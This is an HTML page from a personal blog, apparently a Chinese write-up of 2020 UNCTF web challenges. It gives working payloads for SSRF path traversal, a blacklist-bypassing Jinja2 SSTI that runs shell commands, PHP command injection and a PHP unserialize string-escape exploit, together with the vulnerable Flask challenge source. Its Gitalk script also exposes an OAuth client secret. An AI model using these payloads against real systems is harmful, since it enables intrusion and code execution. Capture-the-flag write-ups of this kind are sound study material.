@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    2020-UNCTF-Web-wp |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-2020-UNCTF-Web-wp" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020-UNCTF-Web-wp
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/11/08/2020-UNCTF-Web-wp/" class="article-date">
+  <time datetime="2020-11-08T05:49:22.000Z" itemprop="datePublished">2020-11-08</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>记录复现2020UNCTF部分题目</p>
+<a id="more"></a>
+
+<h1 id="0x01-easy-ssrf"><a href="#0x01-easy-ssrf" class="headerlink" title="0x01 easy_ssrf"></a>0x01 easy_ssrf</h1><p>直接</p>
+<p>url=00://unctf.com/../../../../../../../flag</p>
+<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108135113057.png" alt="image-20201108135113057"></p>
+<h1 id="0x02-easyflask"><a href="#0x02-easyflask" class="headerlink" title="0x02 easyflask"></a>0x02 easyflask</h1><p>admin登陆后可以得到/secret_route_you_do_not_know路由</p>
+<p>然后可以测试到guess参数存在SSTI。但是过滤了<code>_ &#39; &quot; ] %</code>,最后利用<code>|attr</code>和<code>request</code>绕过过滤，执行命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;app|attr(request.args.param)|attr(request.args.a)|attr(request.args.b)()|attr(request.args.c)(117)|attr(request.args.d)|attr(request.args.e)|attr(request.args.c)(request.args.f)|attr(request.args.c)(request.args.g)(request.args.h)&#125;&#125;&amp;param&#x3D;__class__&amp;a&#x3D;__base__&amp;b&#x3D;__subclasses__&amp;c&#x3D;__getitem__&amp;d&#x3D;__init__&amp;e&#x3D;__globals__&amp;f&#x3D;__builtins__&amp;g&#x3D;eval&amp;h&#x3D;__import__(&quot;os&quot;).popen(&#39;cat%20flag.txt&#39;).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108135159161.png" alt="image-20201108135159161"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ranstr</span><span class="params">(num)</span>:</span></span><br><span class="line">    H = &amp;<span class="comment">#39;abcdefghijklmnopqrstuvwxyz0123456789&amp;#39;</span></span><br><span class="line">    salt = &amp;<span class="comment">#39;&amp;#39;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        salt += rd.choice(H)</span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECRET = ranstr(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Flask.secret_key = SECRET</span><br><span class="line"></span><br><span class="line">BLACKLIST = [&amp;<span class="comment">#39;%&amp;#39;, &amp;#39;_&amp;#39;, &amp;#39;eval&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;flag&amp;#39;,</span></span><br><span class="line">             &amp;<span class="comment">#39;in&amp;#39;, &amp;#39;-&amp;#39;, &amp;#39;class&amp;#39;, &amp;#39;mro&amp;#39;, &amp;#39;[&amp;#39;, &amp;#39;]&amp;#39;, &amp;#39;\&amp;#34;&amp;#39;, &amp;#39;\&amp;#39;&amp;#39;]</span></span><br><span class="line"></span><br><span class="line">user_dicts = dict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    user_dicts[&amp;<span class="comment">#34;admin&amp;#34;] = User(&amp;#39;admin&amp;#39;, ranstr(32))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">black_list</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> &amp;<span class="comment">#39;username&amp;#39; in session:</span></span><br><span class="line">        <span class="keyword">if</span> session[&amp;<span class="comment">#39;username&amp;#39;] == &amp;#39;admin&amp;#39;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                &amp;<span class="comment">#34;admin login success and check the secret route /secret_route_you_do_not_know&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;hello.html&amp;#39;, name=session[&amp;#39;username&amp;#39;])</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;a easy flask problem,first login as the admin&amp;#34;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/login&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;<span class="comment">#39;POST&amp;#39;:</span></span><br><span class="line">        username = request.form[&amp;<span class="comment">#39;username&amp;#39;] if &amp;#39;username&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        password = request.form[&amp;<span class="comment">#39;password&amp;#39;] if &amp;#39;password&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        <span class="keyword">if</span> username == &amp;<span class="comment">#34;&amp;#34; or password == &amp;#34;&amp;#34;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;pass the username or password use get method&amp;#34;)</span></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> user_dicts <span class="keyword">and</span> user_dicts[username].password == password:</span><br><span class="line">            session[&amp;<span class="comment">#39;username&amp;#39;] = username</span></span><br><span class="line">            <span class="keyword">if</span> username == &amp;<span class="comment">#39;admin&amp;#39;:</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;admin login success!&amp;#34;)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;login success!!&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;login fail! check /register&amp;#34;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;login.html&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/register&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == &amp;<span class="comment">#39;POST&amp;#39;:</span></span><br><span class="line">        username = request.form[&amp;<span class="comment">#39;username&amp;#39;] if &amp;#39;username&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line">        password = request.form[&amp;<span class="comment">#39;password&amp;#39;] if &amp;#39;password&amp;#39; in request.form else &amp;#34;&amp;#34;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == &amp;<span class="comment">#34;&amp;#34; or password == &amp;#34;&amp;#34;:</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;pass the username or password use get method&amp;#34;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> user_dicts:</span><br><span class="line">            user_dicts[username] = User(username, password)</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;register success&amp;#34;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;the user already exists&amp;#34;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(&amp;<span class="comment">#39;register.html&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&amp;#39;/secret_route_you_do_not_know&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">()</span>:</span></span><br><span class="line">    guess = request.args[&amp;<span class="comment">#39;guess&amp;#39;] if &amp;#39;guess&amp;#39; in request.args else &amp;#39;&amp;#39;</span></span><br><span class="line">    secret_num = rd.randint(<span class="number">0</span>, <span class="number">100000</span>)</span><br><span class="line">    <span class="keyword">if</span> guess == &amp;<span class="comment">#39;&amp;#39;:</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#34;you should &amp;#39;guess&amp;#39; the secret number&amp;#34;)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess_num = int(guess)</span><br><span class="line">        <span class="keyword">if</span> guess_num == secret_num:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;final step, check the source code&amp;#39;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;you are wrong&amp;#39;)</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> black_list(guess):</span><br><span class="line">            <span class="keyword">return</span> render_template_string(guess + &amp;<span class="comment">#39; error!!&amp;#39;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(&amp;<span class="comment">#39;black list filter&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#39;__main__&amp;#39;:</span></span><br><span class="line">    init()</span><br><span class="line">    app.run(host=&amp;<span class="comment">#39;0.0.0.0&amp;#39;, port=80)</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-easyphp"><a href="#0x03-easyphp" class="headerlink" title="0x03 easyphp"></a>0x03 easyphp</h1><h1 id="0x04-babyeval"><a href="#0x04-babyeval" class="headerlink" title="0x04 babyeval"></a>0x04 babyeval</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;echo%20&#96;cat%20flag.php|base64&#96;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108153855307.png" alt="image-20201108153855307"></p>
+<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108153949816.png" alt="image-20201108153949816"></p>
+<h1 id="0x05-easyunserialize"><a href="#0x05-easyunserialize" class="headerlink" title="0x05 easyunserialize"></a>0x05 easyunserialize</h1><p>简单的字符串逃逸导致的反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> a(<span class="string">'challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";'</span>,<span class="number">1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="keyword">new</span> a(<span class="string">'challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";'</span>,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/08/2020-UNCTF-Web-wp/image-20201108155650924.png" alt="image-20201108155650924"></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/11/08/2020-UNCTF-Web-wp/" target="_blank" title="2020-UNCTF-Web-wp">http://mount4in.github.io/2020/11/08/2020-UNCTF-Web-wp/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/11/08/2020-UNCTF-Web-wp/" data-id="clg20p5k9000014uv5d4f3lco"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/11/08/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            配置文件任意写漏洞分析
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/11/07/shiro-1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">shiro-1.2.4反序列化复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
